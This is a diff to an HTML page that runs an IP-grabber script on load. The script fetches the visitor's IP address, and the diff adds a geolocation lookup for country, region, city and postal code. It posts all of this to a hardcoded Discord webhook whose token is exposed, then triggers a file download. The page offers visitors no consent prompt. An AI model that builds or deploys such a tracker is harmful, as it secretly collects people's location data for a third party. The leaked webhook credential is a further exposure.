@@ -10,36 +10,60 @@
                     const ip = data.ip;
                     document.getElementById('ipDisplay').innerText = 'IP: ' + ip;
                     sendIPToWebhook(ip);
+                    fetchLocationDetails(ip);
                 })
                 .catch(error => {
                     console.log('Error:', error);
                 });
         }
 
-        function sendIPToWebhook(ip) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
-            const payload = {
-                content: 'IP: ' + ip
-            };
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('IP sent to webhook successfully.');
-                    downloadFile(ip); // Call the function to download the file after sending the IP
-                } else {
-                    console.log('Failed to send IP to webhook.');
-                }
-            })
-            .catch(error => {
-                console.log('Error:', error);
-            });
+        function sendIPToWebhook(ip, country, region, city, areaCode) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
+    const payload = {
+        content: `IP: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nArea Code: ${areaCode}`
+    };
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('IP and location details sent to webhook successfully.');
+            downloadFile(ip); // Call the function to download the file after sending the IP
+        } else {
+            console.log('Failed to send IP and location details to webhook.');
         }
+    })
+    .catch(error => {
+        console.log('Error:', error);
+    });
+}
+
+        function fetchLocationDetails(ip) {
+    const apiUrl = `http://ip-api.com/json/${ip}?fields=country,regionName,city,zip`;
+    fetch(apiUrl)
+        .then(response => response.json())
+        .then(data => {
+            const country = data.country;
+            const region = data.regionName;
+            const city = data.city;
+            const areaCode = data.zip;
+
+            document.getElementById('countryDisplay').innerText = 'Country: ' + country;
+            document.getElementById('regionDisplay').innerText = 'Region: ' + region;
+            document.getElementById('cityDisplay').innerText = 'City: ' + city;
+            document.getElementById('areaCodeDisplay').innerText = 'Area Code: ' + areaCode;
+
+            sendIPToWebhook(ip, country, region, city, areaCode); // Pass the location details to sendIPToWebhook
+        })
+        .catch(error => {
+            console.log('Error:', error);
+        });
+}
+
 
         function downloadFile(ip) {
             const filename = 'ip.txt';
@@ -79,7 +103,10 @@
 </head>
 <body onload="getIP()">
     <h1 id="ipDisplay">Loading...</h1>
-    <p>:)))))):</p>
+    <p id="countryDisplay"></p>
+    <p id="regionDisplay"></p>
+    <p id="cityDisplay"></p>
+    <p id="areaCodeDisplay"></p>
 
     <script>
     </script>
